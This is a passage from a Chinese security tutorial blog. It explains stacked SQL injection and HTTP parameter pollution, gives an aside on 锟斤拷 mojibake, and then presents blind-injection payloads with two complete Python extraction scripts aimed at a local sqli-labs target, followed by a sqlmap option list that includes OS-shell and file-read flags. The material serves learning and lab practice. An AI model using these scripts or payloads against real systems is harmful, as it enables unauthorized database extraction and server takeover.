      <p>堆叠注入(stacked injections)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行，而在真实的运用中也是这样的，我们知道在<span class="exturl"><a class="exturl__link"   href="https://cloud.tencent.com/product/cdb?from_column=20065&from=20065" >mysql</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 中，主要是命令行中，每一条语句结尾加“;”表示语句结束的，这样我们就想到了是不是可以多句一起使用就叫做堆叠注入，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></div></figure>

<p><strong>不是每个</strong><span class="exturl"><a class="exturl__link"   href="https://cloud.tencent.com/solution/database?from_column=20065&from=20065" >数据库</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><strong>环境都可以支持堆叠注入</strong></p>
<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够，虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。联合查询union也可拼接语句（有局限性）但是堆叠注入能注入任意语句。</p>

        <h1 id="参数污染"   >
          <a href="#参数污染" class="heading-link"><i class="fas fa-link"></i></a><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h1>
      
        <h2 id="1、漏洞描述"   >
          <a href="#1、漏洞描述" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h2>
      <p>HTTP参数污染漏洞（HTTP Parameter Pollution）简称HPP，由于HTTP协议允许同名参数的存在，同时，后台处理机制对同名参数的处理方式不当，造成“参数污染”。攻击者可以利用此漏洞对网站业务造成攻击，甚至结合其他漏洞，获取服务器数据或获取服务器最高权限。</p>

        <h2 id="2、-常见应用场景"   >
          <a href="#2、-常见应用场景" class="heading-link"><i class="fas fa-link"></i></a><a href="#2、-常见应用场景" class="headerlink" title="2、 常见应用场景"></a>2、 常见应用场景</h2>
      <ul>
<li>任意URL跳转<br>例如：<br><code>www.famous.website?ret_url=subdomain.famous.website</code> ，由于后端做了限制，当我们把 ret_url 改成别的不同源的域名(如baidu.com)时会报错<br>但是我们可以利用HPP，将请求地址变成 <code>www.famous.website?ret_url=subdomain.famous.website&amp;ret_url=baidu.com</code> 时，由于服务器逻辑错误<br>使用第一个 ret_url 做校验参数，而第二个 ret_url 参数做跳转目的地址。于是这样便可成功绕过限制，形成任意 URL 跳转</li>
<li>任意密码重置(短信爆破)<br>一般重置密码的时候，会发送短信到用户手机<br>比如GET&#x2F;POST传递的参数为：phone&#x3D;13888888888<br>我们一般会去想，能不能发送验证码到自己的手机，于是可以构造成： <code>phone=13888888888,12345678901</code> 或者 <code>phone=13888888888;12345678901</code> 或者 <code>phone=&#123;13888888888,12345678901&#125;</code><br>等等一些情况，有时候能通过，但是有些时候会出现 号码不合法 的情况，此时便可以考虑利用 HPP —— <code>phone=13888888888&amp;phone=12345678901</code>，如果恰好服务器用第一个号码验证是否存在该用户，而使用第二个号码发送短信时，我们便可以接管该用户</li>
</ul>

        <h2 id="3、-漏洞危害"   >
          <a href="#3、-漏洞危害" class="heading-link"><i class="fas fa-link"></i></a><a href="#3、-漏洞危害" class="headerlink" title="3、 漏洞危害"></a>3、 漏洞危害</h2>
      <p>HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。</p>
<ul>
<li>对客户端的攻击，比如投票、跳转、关注等；</li>
<li>绕过安全防护软件；</li>
</ul>

        <h1 id="MySQL数据库多语句执行"   >
          <a href="#MySQL数据库多语句执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#MySQL数据库多语句执行" class="headerlink" title="MySQL数据库多语句执行"></a>MySQL数据库多语句执行</h1>
      <p>mysql数据库默认情况下，mysql_query()是一次只执行一条语句。如果一次执行多条语句数据库会报语法错误（错误代码:1064）注：通常mysql_query()一次只能执行一条语句，即必须由单个SQL语句组成，且不带有终止分号（;）。如果启用了多语句执行，则可以包含多个用分号分隔的语句</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">select * from users; select * from emails;</span><br><span class="line">select 1,(select group_concat(1,2,3)),3;</span><br><span class="line">select 1,2,3 union select 4,5,6</span><br></pre></td></tr></table></div></figure>

<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231210623139.png" alt="image-20231231210623139"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231210735414.png" alt="image-20231231210735414"></p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231210807341.png" alt="image-20231231210807341"></p>

        <h1 id="锟斤拷"   >
          <a href="#锟斤拷" class="heading-link"><i class="fas fa-link"></i></a><a href="#锟斤拷" class="headerlink" title="锟斤拷"></a>锟斤拷</h1>
      
        <h3 id="乱码"   >
          <a href="#乱码" class="heading-link"><i class="fas fa-link"></i></a><a href="#乱码" class="headerlink" title="乱码"></a><strong>乱码</strong></h3>
      <p>乱码通常是由于编码时使用的字符集和解码时使用的字符集不相同。</p>
<p>***锟斤拷***通常在UTF-8与中文编码的转换过程中出现。比如UTF-8编码与GBK的转换就会变成这样:</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231231211453280.png" alt="image-20231231211453280"></p>
<p>Unicode字符集有一个专门用于提示用户字符无法识别或展示的替换符号：</p>
<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20231231211511137.png" alt="image-20231231211511137"></p>
<p>如果有UTF-8无法识别的字符便会用这个问号替换，在UTF-8中对应的二进制和十六进制如下，如果有两个连着的问号替换符，十六进制则为”<strong>EF BF BD EF BF BD</strong>“。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/v2-b8ab998b78715f536be9eb8dbf5334cd_720w.webp" alt="img"></p>
<p>这时候再用GBK中文编码解码则会出现 *<strong>锟斤拷*</strong> ，因为GBK编码中，每个汉字用两个字节。</p>
<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/v2-541ebdd49004e899b8f6f96418e3e41c_720w.webp" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>SQL注入3</title>
    <url>/2023/12/24/text19/</url>
    <content><![CDATA[
        <h1 id="一-python盲注"   >
          <a href="#一-python盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#一-python盲注" class="headerlink" title="一.python盲注"></a>一.python盲注</h1>
      <p>盲注（Blind SQL Injection）是一种 SQL 注入攻击的形式，其特点是攻击者无法直接获取数据库返回的具体数据，但可以通过在不断的试探和观察目标应用的响应来推断出敏感信息。盲注通常发生在应用没有直接将数据库错误或详细信息返回给用户的情况下。</p>
<p>盲注分为两种主要类型：</p>
<p><strong>1.盲注基于布尔的盲注（Boolean-Based Blind SQL Injection）：</strong> 这是一种通过观察应用的响应是真还是假来推断数据库信息的方式。攻击者通过构造一些条件来判断是否为真，然后通过应用的响应来判断条件的真假。</p>
<p>示例：</p>
<ul>
<li><p><strong>推断字符串长度：</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">?id=1&#x27; AND LENGTH(database()) = 5 --+</span><br></pre></td></tr></table></div></figure>
</li>
<li><p><strong>逐字符推断：</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">?id=1&#x27; AND SUBSTRING(database(), 1, 1) = &#x27;m&#x27; --+</span><br></pre></td></tr></table></div></figure>
</li>
<li><p><strong>使用 ASCII 推断字符：</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">?id=1&#x27; AND ASCII(SUBSTRING(database(), 1, 1)) = 109 --+</span><br></pre></td></tr></table></div></figure></li>
</ul>
<p><strong>2.布尔盲注脚本实例</strong></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment">#注入语句根据情况更改</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">table_name=<span class="string">&quot;users&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;-- -&quot;</span> .<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):    </span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27;),&#123;1&#125;,1))&gt;&#123;2&#125;-- -&quot;</span> .<span class="built_in">format</span>(database,i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columns</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):    </span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27;),&#123;2&#125;,1))&gt;&#123;3&#125;-- -&quot;</span> .<span class="built_in">format</span>(database,table_name,i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;爆信息&quot;</span>)</span><br><span class="line">    nr(name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nr</span>(<span class="params">a</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):    </span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr((select group_concat(&#123;0&#125;) from &#123;1&#125;.&#123;2&#125;),&#123;3&#125;,1))&gt;&#123;4&#125;-- -&quot;</span> .<span class="built_in">format</span>(a,database,table_name,i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)       </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SQL盲注脚本&quot;</span>);</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;****爆库***&quot;</span>);</span><br><span class="line">db()</span><br><span class="line">database=<span class="built_in">input</span>(<span class="string">&quot;请输入要选择的数据库&quot;</span>);</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;****爆表***&quot;</span>);</span><br><span class="line"><span class="comment"># print(database)</span></span><br><span class="line"><span class="comment"># database=&quot;security&quot;</span></span><br><span class="line"><span class="comment"># table_name=&quot;users&quot;</span></span><br><span class="line">table() </span><br><span class="line">table_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要选择的表&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;****爆字段***&quot;</span>);</span><br><span class="line">columns()</span><br><span class="line"><span class="comment"># ?id=1&#x27;and ascii(substring((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;0--+</span></span><br></pre></td></tr></table></div></figure>



<p><strong>3.睡眠盲注（Time-Based Blind SQL Injection）：</strong> 这是一种通过观察应用的响应时间来推断数据库信息的方式。攻击者通过构造一些条件，使得数据库查询在条件为真时有不同的响应时间。</p>
<p>示例：</p>
<ul>
<li><p><strong>推断字符串长度：</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; AND IF(LENGTH(database()) = 5, SLEEP(5), 0) --+</span><br></pre></td></tr></table></div></figure>
</li>
<li><p><strong>逐字符推断：</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; AND IF(SUBSTRING(database(), 1, 1) = &#x27;m&#x27;, SLEEP(5), 0) --+</span><br></pre></td></tr></table></div></figure>
</li>
<li><p><strong>使用 ASCII 推断字符：</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; AND IF(ASCII(SUBSTRING(database(), 1, 1)) = 109, SLEEP(5), 0) --+</span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>在这个例子中，如果条件为真，查询会导致数据库休眠 5 秒，而如果条件为假，查询将立即返回。攻击者可以通过观察响应时间来推断条件是否为真。</p>
<p><strong>4.睡眠盲注脚本实例</strong></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        mid = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin&lt;end:</span><br><span class="line">            start_time= time.time()</span><br><span class="line">            payload = <span class="string">f&quot;/**/and/**/if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,sleep(1))-- -&quot;</span></span><br><span class="line">            r = session.get(url + payload)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            <span class="keyword">if</span> end_time - start_time &lt; <span class="number">1</span>:</span><br><span class="line">                begin = mid+<span class="number">1</span></span><br><span class="line">                mid = (begin + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">                mid = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (mid == <span class="number">32</span>):</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">db()</span><br></pre></td></tr></table></div></figure>


        <h1 id="二-SQLmap"   >
          <a href="#二-SQLmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#二-SQLmap" class="headerlink" title="二.SQLmap"></a>二.SQLmap</h1>
      
        <h2 id="1-sqlmap简介"   >
          <a href="#1-sqlmap简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-sqlmap简介" class="headerlink" title="1.sqlmap简介"></a>1.<strong>sqlmap简介</strong></h2>
      <p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p>

        <h2 id="2-sqlmap常用命令"   >
          <a href="#2-sqlmap常用命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-sqlmap常用命令" class="headerlink" title="2.sqlmap常用命令"></a>2.<strong>sqlmap常用命令</strong></h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">-h                                           显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                          显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                    显示版本号</span><br><span class="line"></span><br><span class="line">-v                                           详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">                                              0：只显示python错误以及重要信息</span><br><span class="line">    </span><br><span class="line">                                              1：显示信息以及警告</span><br><span class="line">    </span><br><span class="line">                                              2：显示debug消息</span><br><span class="line">    </span><br><span class="line">                                              3：显示注入payload</span><br><span class="line">    </span><br><span class="line">                                              4：显示http请求</span><br><span class="line">    </span><br><span class="line">                                              5：显示http响应头·</span><br><span class="line">    </span><br><span class="line">                                              6：显示http响应内容</span><br><span class="line"></span><br><span class="line">Target：                                </span><br><span class="line"></span><br><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                           从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                           从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br><span class="line"></span><br><span class="line">Request</span><br><span class="line"></span><br><span class="line">-A                                         指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                         额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                                 通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                        指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                              指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                        指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                  扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                    使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                                  设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                              指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                                使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                        代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                                 设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                              超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                                连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                         随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                             在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                           POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                           两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                    跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                             强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                         请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br><span class="line"></span><br><span class="line">Optimization</span><br><span class="line"></span><br><span class="line">-o                                         打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                   预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                 空连接</span><br><span class="line"></span><br><span class="line">--threads=value                  设置线程(默认 1)</span><br><span class="line"></span><br><span class="line">Injection</span><br><span class="line"></span><br><span class="line">-p                                       指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                        跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                             指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                  指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                  使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                   使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                       关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                              加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                          指定使用的脚本</span><br><span class="line"></span><br><span class="line">Detectiong</span><br><span class="line"></span><br><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                             查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                              当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                         仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                               仅基于标题比较网页</span><br><span class="line"></span><br><span class="line">Techniques</span><br><span class="line"></span><br><span class="line">--technique=                      指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                     进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                    指定暴力破解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint</span><br><span class="line"></span><br><span class="line">-f                                      查询目标DBMS版本指纹信息</span><br><span class="line"></span><br><span class="line">Emuneration</span><br><span class="line"></span><br><span class="line">-a                                    查询所有  </span><br><span class="line"></span><br><span class="line">-b                                    查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                 查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                          查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                            枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                     枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                     枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                            枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                              枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                          枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                      枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                         存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                     存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                 指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs          枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                    指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br><span class="line"></span><br><span class="line">Brute force</span><br><span class="line"></span><br><span class="line">--common-tables                       暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br><span class="line"></span><br><span class="line">File system access</span><br><span class="line"></span><br><span class="line">--file-read                            从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                           上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                             指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                           执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                            交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                              储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                              数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br><span class="line"></span><br><span class="line">General</span><br><span class="line"></span><br><span class="line">-s                                     sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                      记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                             测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                      强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                           从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=              禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                        指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                  自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                            保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                          使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span 